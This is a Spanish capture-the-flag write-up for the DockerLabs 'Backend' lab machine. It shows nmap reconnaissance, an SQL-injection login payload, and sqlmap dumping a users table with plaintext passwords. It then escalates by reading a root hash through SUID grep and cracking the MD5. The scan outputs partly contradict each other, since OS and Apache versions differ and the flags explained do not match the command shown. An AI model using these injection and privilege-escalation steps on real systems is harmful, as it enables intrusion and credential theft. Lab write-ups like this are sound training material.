#MAQUINA #DOCKERLABS #FACIL 
#SQLI #MD5
#SQLMAP 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Backend** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 09:09 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 08:ba:95:95:10:20:1e:54:19:c3:33:a8:75:dd:f8:4d (ECDSA)
|_  256 1e:22:63:40:c9:b9:c5:6f:c2:09:29:84:6f:e7:0b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: test page
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 11:58 CET
Nmap scan report for 172.17.0.2
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 09:09 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|_  /css/: Potentially interesting directory w/ listing on 'apache/2.4.61 (debian)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

# EXPLOTACION

Al revisar la web que hay en el puerto 80, vemos que hay un login. 
Al meter una contra cualquiera y meterle como usuario -> **a' or 1=1 -- -** , salta un error, por lo que es vulnerable a un SQLI, vamos a automatizarlo usando **sqlmap**

   ```bash

sqlmap -u "http://172.17.0.2/login.html" --batch --forms --dbs                      

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users


sqlmap -u "http://172.17.0.2/login.html" --batch --forms -D users --tables

Database: users
[1 table]
+----------+
| usuarios |
+----------+

sqlmap -u "http://172.17.0.2/login.html" --batch --forms -D users -T usuarios --dump

Database: users
Table: usuarios
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+

```

La de **pepe** es credencial para **ssh**

# ESCALADA PRIVILEGIOS

Buscamos archivos con permisos SUID:
   ```bash
pepe@bd14d5838466:~$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/ls
/usr/bin/mount
/usr/bin/grep
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Vemos **ls y grep** con permisos SUID y encontramos un hash en el directorio **/root** :
   ```bash
pepe@bd14d5838466:~$ ls /root
pass.hash
pepe@bd14d5838466:~$ grep '' /root/pass.hash
e43833c4c9d5ac444e16bb94715a75e4

```

ES MD5 (https://www.md5online.org/md5-decrypt.html?utm_content=cmp-true) -> **spongebob34**

**YA ESTAMOS COMO ROOT.**